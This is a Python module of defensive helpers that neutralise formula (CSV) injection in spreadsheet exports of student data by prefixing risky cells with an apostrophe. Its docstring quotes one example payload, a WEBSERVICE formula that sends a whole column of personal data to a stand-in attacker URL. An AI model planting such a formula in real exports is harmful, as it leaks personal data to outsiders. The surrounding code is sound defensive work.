"""Excel formula-injection (CSV/formula injection) safety helpers.

Security (issue #1081 finding G): student-supplied free-text values (dynamic
form fields, names, etc.) are written into .xlsx exports that college/admin
reviewers download and open. openpyxl writes a string beginning with ``=`` as a
LIVE formula cell; a payload such as
``=WEBSERVICE("https://attacker/x?d="&TEXTJOIN(",",TRUE,N:N))`` can reference
the entire sheet and exfiltrate the whole cohort's PII to an attacker URL once a
reviewer opens the file and enables editing. LibreOffice Calc has no Protected
View gate at all.

Mitigation: prefix any exported STRING value that begins with a formula-trigger
character (`=`, `+`, `-`, `@`) or a control character that a spreadsheet may
treat as a formula lead-in (tab, CR, LF) with a single apostrophe, which forces
the cell to be treated as literal text. Numbers, dates, bools, None and already
safe strings are returned unchanged so normal exports are byte-for-byte
identical.
"""

from typing import Any, Dict

# Characters that make a spreadsheet interpret the cell as a formula when they
# lead the value. Tab/CR/LF are included because some importers strip a leading
# apostrophe-less control char and re-expose the following `=`.
_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r", "\n")


def is_formula_injection_risk(value: Any) -> bool:
    """True when ``value`` is a string a spreadsheet may evaluate as a formula."""
    return isinstance(value, str) and bool(value) and value[0] in _FORMULA_TRIGGERS


def sanitize_excel_cell(value: Any) -> Any:
    """Return ``value`` made safe to write into an openpyxl cell.

    Only ``str`` values are altered — and only when they begin with a
    formula-trigger character, by prefixing a single apostrophe. All other
    types (int/float/bool/datetime/None/…) pass through unchanged so numeric and
    date cells keep their native type and formatting.
    """
    if is_formula_injection_risk(value):
        return "'" + value
    return value


def sanitize_csv_row(row: Dict[str, Any]) -> Dict[str, Any]:
    """Return a new dict with every value made safe for ``csv.DictWriter``.

    A CSV field carries no cell type, so the apostrophe prefix is the only
    portable text marker Excel/LibreOffice honour on import — the same
    neutralisation :func:`sanitize_excel_cell` applies. Returns a NEW dict; the
    caller's row is never mutated.
    """
    return {key: sanitize_excel_cell(value) for key, value in row.items()}


def neutralise_worksheet(ws, *, min_row: int = 1) -> int:
    """Neutralise every formula-triggering cell already written to ``ws``.

    For sheets this codebase does not write cell-by-cell — notably
    ``DataFrame.to_excel``, which assigns through openpyxl and would otherwise
    emit an admin-authored column label beginning with ``=`` as a live formula.
    Returns the number of cells neutralised.

    ``min_row`` exists for ROUND-TRIPPED sheets. Some templates this system
    generates are filled in by staff and re-uploaded, and the importer matches
    columns by exact header string (see
    ``batch_import_service.build_submitted_form_data``'s ``custom_field_mapping``).
    Prefixing an apostrophe onto such a header makes it match nothing on
    re-upload and every value in that column is silently dropped — so pass
    ``min_row=2`` to leave the header row byte-identical. Only do that where the
    header is admin-authored configuration rather than applicant free-text.

    No export in this codebase writes an intentional formula, so within the swept
    range there is nothing legitimate to clobber.
    """
    neutralised = 0
    for row in ws.iter_rows(min_row=min_row):
        for cell in row:
            if is_formula_injection_risk(cell.value):
                cell.value = "'" + cell.value
                neutralised += 1
    return neutralised
